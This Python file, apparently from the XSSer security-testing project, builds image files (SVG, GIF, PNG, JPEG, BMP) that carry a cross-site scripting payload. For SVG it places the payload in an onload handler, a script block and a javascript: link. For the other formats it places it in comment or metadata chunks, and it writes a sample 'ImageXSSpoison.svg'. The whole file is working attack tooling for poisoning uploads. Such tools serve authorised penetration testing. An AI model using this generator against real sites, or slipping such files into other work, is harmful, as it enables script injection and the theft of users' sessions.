#!/usr/bin/env python
# -*- coding: utf-8 -*-"
# vim: set expandtab tabstop=4 shiftwidth=4:
"""
This file is part of the XSSer project, https://xsser.03c8.net

Copyright (c) 2010/2026 | psy <epsylon@riseup.net>

xsser is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 3 of the License.

xsser is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with xsser; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import os, struct, zlib

class ImageInjections(object):

    def __init__(self, payload =''):
        self._payload = payload

    def _svg(self, payload):
        doc = ('<?xml version="1.0" encoding="UTF-8" standalone="no"?>\n'
               '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" '
               'width="128" height="128" onload="' + payload + '">\n'
               '<script type="text/javascript"><![CDATA[' + payload + ']]></script>\n'
               '<a xlink:href="javascript:' + payload + '"><text x="10" y="24">XSS</text></a>\n'
               '</svg>\n')
        return doc.encode('utf-8', 'replace')

    def _gif(self, payload):
        pbytes = payload.encode('utf-8', 'replace')
        out = b'GIF89a' + struct.pack('<HH', 1, 1) + b'\x80\x00\x00' + b'\xff\xff\xff\x00\x00\x00'
        comment = b'\x21\xfe'
        for i in range(0, len(pbytes), 255):
            chunk = pbytes[i:i+255]
            comment += bytes([len(chunk)]) + chunk
        comment += b'\x00'
        out += comment
        out += b'\x2c' + struct.pack('<HHHH', 0, 0, 1, 1) + b'\x00'
        out += b'\x02\x02\x44\x01\x00'
        out += b'\x3b'
        return out

    def _png_chunk(self, ctype, data):
        return struct.pack('>I', len(data)) + ctype + data + struct.pack('>I', zlib.crc32(ctype + data) & 0xffffffff)

    def _png(self, payload):
        sig = b'\x89PNG\r\n\x1a\n'
        ihdr = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
        idat = zlib.compress(b'\x00\xff\xff\xff')
        text = b'Comment\x00' + payload.encode('utf-8', 'replace')
        return sig + self._png_chunk(b'IHDR', ihdr) + self._png_chunk(b'tEXt', text) + self._png_chunk(b'IDAT', idat) + self._png_chunk(b'IEND', b'')

    def _jpeg(self, payload):
        pbytes = payload.encode('utf-8', 'replace')
        soi = b'\xff\xd8'
        app0 = b'\xff\xe0' + struct.pack('>H', 16) + b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
        com = b'\xff\xfe' + struct.pack('>H', len(pbytes) + 2) + pbytes
        return soi + app0 + com + b'\xff\xd9'

    def image_xss(self, filename, payload):
        """
        Create an image (SVG/GIF/PNG/JPG/BMP) carrying an XSS payload.
        """
        root, ext = os.path.splitext(filename)
        ext = ext.lower()
        user_payload = payload
        if not user_payload:
            user_payload = "<script>alert('XSS')</script>"
        builders = {'.svg':self._svg, '.gif':self._gif, '.png':self._png, '.jpg':self._jpeg, '.jpeg':self._jpeg}
        if ext in builders:
            content = builders[ext](user_payload)
        elif ext == ".bmp":
            content = b'BM' + user_payload.encode('utf-8', 'replace')
        else:
            return "\n[Error] Supported extensions = .SVG, .GIF, .PNG, .JPG or .BMP\n"
        f = open(filename, 'wb')
        f.write(content)
        f.close()
        return "\n[Info] XSS payload: \n\n " + user_payload + "\n\n[Info] File written: \n\n " + root + ext + " (" + str(len(content)) + " bytes)\n"

if __name__ == '__main__':
    image_xss_injection = ImageInjections('')
    print(image_xss_injection.image_xss('ImageXSSpoison.svg', "alert('XSS')"))
